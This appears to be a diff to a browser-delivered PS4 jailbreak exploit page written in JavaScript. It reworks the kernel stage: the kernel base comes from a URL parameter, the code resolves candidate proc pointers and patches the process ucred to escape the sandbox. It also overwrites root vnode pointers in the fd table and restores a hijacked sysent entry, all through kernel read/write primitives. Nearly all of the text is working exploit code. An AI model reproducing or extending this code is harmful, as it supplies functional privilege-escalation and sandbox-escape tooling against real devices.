@@ -118,7 +118,7 @@ html, body {
 // ========== SHARED CONFIG ==========
 var Q = new URLSearchParams(location.search);
 
-var REVISION = "genuine-u8-rw-5-1352";
+var REVISION = "genuine-u8-rw-6-1352";
 var headerMsg = "mansoor0x";
 
 var MAX_ATTEMPTS = (function(){
@@ -139,7 +139,7 @@ var CARRIER_SLOTS = (function(){
     return Math.max(100000, Math.min(4000000, v));
 })();
 var SKIP_JAILBREAK = Q.get("jb") === "0" || Q.get("l") === "1";
-var SKIP_UCRED_SIG_SCAN = Q.get("ksig") === "0";
+var FORCE_UCRED_SIG_SCAN = Q.get("ksig") === "1";
 var JB_DELAY_MS = (function(){
     var v = parseInt(Q.get("jbdelay") || "7500", 10);
     if (!isFinite(v)) v = 7500;
@@ -218,6 +218,9 @@ var TAG_MAP = {
     "SYSENT-HIJACKED":    ["KEXPLOIT", "pass"],
     "KSCAN-BEGIN":        ["KEXPLOIT", "run"],
     "KSCAN-PROC-DONE":    ["KEXPLOIT", "info"],
+    "KSCAN-SIG-SKIP":     ["KEXPLOIT", "info"],
+    "PROC-CAND":          ["KEXPLOIT", "info"],
+    "PRISON0":            ["KEXPLOIT", "info"],
     "JAILBREAK-ERROR":    ["KEXPLOIT", "fail"],
     "SCAN-HIT":           ["SANDBOX", "info"],
     "UCRED-SIG-CANDIDATE":["SANDBOX", "info"],
@@ -463,6 +466,41 @@ var fwOffsets = PS4_OFFSETS[FW_LABEL] || PS4_OFFSETS[""];
 
 // ========== UTILITY ==========
 function hex(value) { return "0x" + value.toString(16); }
+
+function kptrBig(v) {
+    var b = typeof v === "bigint" ? v : BigInt(v);
+    return b > 0xffffffff00000000n && b < 0xffffffffffff0000n;
+}
+
+function kernelBaseFromQuery() {
+    var raw = Q.get("kb");
+    if (!raw) return 0xffffffff80000000n;
+    raw = String(raw).trim().toLowerCase();
+    if (raw.indexOf("0x") === 0) raw = raw.slice(2);
+    try { return BigInt("0x" + raw); } catch (_) {}
+    return 0xffffffff80000000n;
+}
+
+function buildProcCandidates(kbase, evfOff) {
+    var out = [];
+    var seen = Object.create(null);
+    function add(v) {
+        if (!kptrBig(v)) return;
+        var key = v.toString(16);
+        if (seen[key]) return;
+        seen[key] = 1;
+        out.push(v);
+    }
+    var sym = kbase + BigInt(evfOff);
+    add(sym);
+    try { add(read64(sym)); } catch (_) {}
+    try { add(read64(kbase + BigInt(evfOff))); } catch (_) {}
+    try {
+        var p0 = read64(kbase + BigInt(evfOff));
+        if (kptrBig(p0)) add(read64(p0));
+    } catch (_) {}
+    return out;
+}
 function buffer(size) { return new ArrayBuffer(size); }
 function uint32At(bytes, offset) {
     return bytes[offset] + bytes[offset+1]*0x100 + bytes[offset+2]*0x10000 + bytes[offset+3]*0x1000000;
@@ -1033,6 +1071,7 @@ function runJailbreak() {
     var evf, prison0, rootvnode, sysent, jmp, kbase, sysent_661, jmp_rsi;
     var sy_narg, sy_call, sy_thrcnt, proc, sandboxEscaped, verifyUid, verifyGid, verifyPrison;
     var dbgMode, prisonVal, hits, scanOff, sigPtr, sigEnd;
+    var procCandidates, procCandIdx, procResolved;
 
     try {
         evf = fwOffsets.evf;
@@ -1041,15 +1080,20 @@ function runJailbreak() {
         sysent = fwOffsets.sysent;
         jmp = fwOffsets.jmp;
 
-        kbase = 0xffffffff80000000n;
-        mark("KERNEL-BASE", hex(kbase));
+        kbase = kernelBaseFromQuery();
+        mark("KERNEL-BASE", hex(kbase) + (Q.get("kb") ? "-query" : "-default"));
 
         sysent_661 = kbase + BigInt(sysent);
         jmp_rsi = kbase + BigInt(jmp);
         mark("SYSENT-661", hex(sysent_661));
         mark("JMP-RSI", hex(jmp_rsi));
 
-        proc = kbase + BigInt(evf);
+        proc = 0n;
+        procResolved = false;
+        procCandidates = buildProcCandidates(kbase, evf);
+        procCandIdx = 0;
+        mark("PROC-CAND", "count=" + procCandidates.length);
+
         prisonVal = read64(kbase + BigInt(prison0));
         mark("PRISON0", hex(prisonVal));
 
@@ -1095,18 +1139,26 @@ function runJailbreak() {
 
     function finalizeJailbreak() {
         try {
-            var root = read64(kbase + BigInt(rootvnode));
             var rootVerified = false;
-            if (root > 0n && root < 0xffffffffffffn) {
-                var fd = read64(proc + BigInt(0x48));
-                write64(fd + 0x10n, root);
-                write64(fd + 0x18n, root);
-                var fdCheck = read64(fd + 0x10n);
-                rootVerified = fdCheck === root;
-                mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
-                mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
+            if (sandboxEscaped && procResolved && kptrBig(proc)) {
+                var root = read64(kbase + BigInt(rootvnode));
+                if (root > 0n && root < 0xffffffffffffn) {
+                    var fd = read64(proc + 0x48n);
+                    if (kptrBig(fd)) {
+                        write64(fd + 0x10n, root);
+                        write64(fd + 0x18n, root);
+                        var fdCheck = read64(fd + 0x10n);
+                        rootVerified = fdCheck === root;
+                        mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
+                        mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
+                    } else {
+                        mark("ROOT-VNODE-SET", "FAILED-bad-fd");
+                    }
+                } else {
+                    mark("ROOT-VNODE-SET", "FAILED-invalid-root");
+                }
             } else {
-                mark("ROOT-VNODE-SET", "FAILED-invalid-root");
+                mark("ROOT-VNODE-SET", "FAILED-no-curproc");
             }
             restoreSysent();
             mark("===== JAILBREAK COMPLETE =====", "PS4 " + FW_LABEL + " root=" + sandboxEscaped + "-fs=" + rootVerified);
@@ -1117,14 +1169,21 @@ function runJailbreak() {
     }
 
     function beginSigScanOrFinish() {
-        mark("KSCAN-PROC-DONE", "hits=" + hits + "-escaped=" + sandboxEscaped);
+        mark("KSCAN-PROC-DONE", "hits=" + hits + "-escaped=" + sandboxEscaped + "-proc=" + (procResolved ? hex(proc) : "none"));
         if (sandboxEscaped) {
             setTimeout(finalizeJailbreak, 0);
             return;
         }
-        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
-        if (SKIP_UCRED_SIG_SCAN) {
-            mark("SANDBOX-ESCAPE", "FAILED-ksig=0-skipped");
+        if (hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");
+        if (hits === 0 && !FORCE_UCRED_SIG_SCAN) {
+            mark("KSCAN-SIG-SKIP", "no-proc-marker-ksig=1-to-force-wide-scan");
+            mark("SANDBOX-ESCAPE", "FAILED-no-proc-fix-kb-or-kbase-leak");
+            setTimeout(finalizeJailbreak, 0);
+            return;
+        }
+        if (!procResolved || !kptrBig(proc)) {
+            mark("KSCAN-SIG-SKIP", "no-valid-proc-anchor");
+            mark("SANDBOX-ESCAPE", "FAILED-no-proc");
             setTimeout(finalizeJailbreak, 0);
             return;
         }
@@ -1164,15 +1223,55 @@ function runJailbreak() {
         }
     }
 
+    function tryDirectUcredOnProc() {
+        if (!kptrBig(proc)) return false;
+        var ucred = read64(proc + 0x40n);
+        if (!kptrBig(ucred)) return false;
+        if (read64(ucred + 0x30n) !== prisonVal) return false;
+        if (dbgMode) mark("SCAN-HIT", "direct-p-ucred=" + hex(ucred));
+        if (patchAndVerifyUcred(ucred, prisonVal)) {
+            sandboxEscaped = true;
+            mark("SANDBOX-ESCAPE", "success-direct-p-ucred");
+            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
+            return true;
+        }
+        return false;
+    }
+
+    function advanceProcCandidate() {
+        while (procCandIdx < procCandidates.length) {
+            proc = procCandidates[procCandIdx++];
+            scanOff = 0;
+            procResolved = kptrBig(proc);
+            mark("PROC-CAND", hex(proc) + "-idx=" + procCandIdx + "/" + procCandidates.length);
+            if (procResolved && tryDirectUcredOnProc()) return "escaped";
+            if (procResolved) return "scan";
+        }
+        proc = 0n;
+        procResolved = false;
+        return "done";
+    }
+
     function scanProcChunk() {
         try {
+            if (!procResolved) {
+                var adv = advanceProcCandidate();
+                if (adv === "escaped") {
+                    setTimeout(finalizeJailbreak, 0);
+                    return;
+                }
+                if (adv === "done") {
+                    setTimeout(beginSigScanOrFinish, 0);
+                    return;
+                }
+            }
             var end = Math.min(scanOff + 0x100, 0x4000);
             for (; scanOff < end; scanOff += 8) {
                 var candidate = read64(proc + BigInt(scanOff));
                 if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
                     hits++;
                     var ucred = read64(proc + BigInt(scanOff - 0x40));
-                    if (ucred > 0n && ucred < 0xffffffffffffn) {
+                    if (kptrBig(ucred)) {
                         if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + scanOff.toString(16) + "-ucred=" + hex(ucred));
                         if (patchAndVerifyUcred(ucred, prisonVal)) {
                             sandboxEscaped = true;
@@ -1183,8 +1282,16 @@ function runJailbreak() {
                     }
                 }
             }
-            if (!sandboxEscaped && scanOff < 0x4000) setTimeout(scanProcChunk, 0);
-            else setTimeout(beginSigScanOrFinish, 0);
+            if (sandboxEscaped) {
+                setTimeout(finalizeJailbreak, 0);
+                return;
+            }
+            if (scanOff < 0x4000) {
+                setTimeout(scanProcChunk, 0);
+                return;
+            }
+            procResolved = false;
+            setTimeout(scanProcChunk, 0);
         } catch (error) {
             try { restoreSysent(); } catch (_) {}
             mark("JAILBREAK-ERROR", error.message);
@@ -1193,7 +1300,7 @@ function runJailbreak() {
 
     function startKernelScan() {
         compactLog(40);
-        mark("KSCAN-BEGIN", "proc=" + hex(proc));
+        mark("KSCAN-BEGIN", "candidates=" + procCandidates.length);
         setTimeout(scanProcChunk, 0);
     }
 
@@ -1258,7 +1365,7 @@ function runAttempt() {
 // ========== INIT ==========
 updateMeta();
 renderStages();
-mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (SKIP_JAILBREAK ? "0" : "1") + "-jbdelay=" + JB_DELAY_MS + "-ksig=" + (SKIP_UCRED_SIG_SCAN ? "0" : "1"));
+mark("BOOT", "rev=" + REVISION + "-k=" + K + "-n=" + DRAIN_COUNT + "-c=" + CARRIER_SLOTS + "-r=" + MAX_ATTEMPTS + "-jb=" + (SKIP_JAILBREAK ? "0" : "1") + "-jbdelay=" + JB_DELAY_MS + "-ksig=" + (FORCE_UCRED_SIG_SCAN ? "1" : "0"));
 try {
     runAttempt();
 } catch (error) {
